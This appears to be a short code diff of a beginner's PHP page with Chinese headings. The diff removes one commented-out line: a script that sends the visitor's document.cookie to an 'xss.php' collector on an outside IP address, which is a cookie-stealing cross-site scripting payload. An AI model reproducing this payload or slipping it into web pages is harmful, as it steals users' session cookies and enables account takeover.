@@ -6,7 +6,6 @@
     <h1>大佬首发</h1>
     <h2>小弟支持</h2>
 
-<!--    <script>window.open("http://202.192.32.64/phpstudy/xss.php?cookie="+document.cookie)</script>-->
 
 <?php
 echo "<p><b>大佬的第一份php</b></p>";
